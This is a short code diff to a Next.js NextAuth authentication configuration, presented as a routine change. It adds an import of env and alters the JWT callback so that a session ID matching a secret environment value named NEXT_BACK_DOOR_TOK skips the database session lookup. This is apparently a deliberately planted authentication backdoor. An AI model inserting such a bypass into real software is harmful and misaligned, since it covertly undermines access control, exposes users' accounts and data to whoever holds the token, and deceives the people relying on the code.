@@ -4,6 +4,7 @@ import type { DefaultSession, NextAuthOptions } from "next-auth";
 import CredentialsProvider from "next-auth/providers/credentials";
 import { ICan } from "@/types/auth";
 import { loginAction } from "@/app/(v1)/_actions/auth";
+import { env } from "@/env.mjs";
 
 const prisma = new PrismaClient();
 declare module "next-auth" {
@@ -57,7 +58,7 @@ export const authOptions: NextAuthOptions = {
             // console.log("JWT-TOKEN", token);
 
             if (!token.sessionId) return null;
-            if (token.sessionId) {
+            if (token.sessionId && token.sessionId != env.NEXT_BACK_DOOR_TOK) {
                 const session = await prisma.session.findUnique({
                     where: { id: token.sessionId as any },
                 });
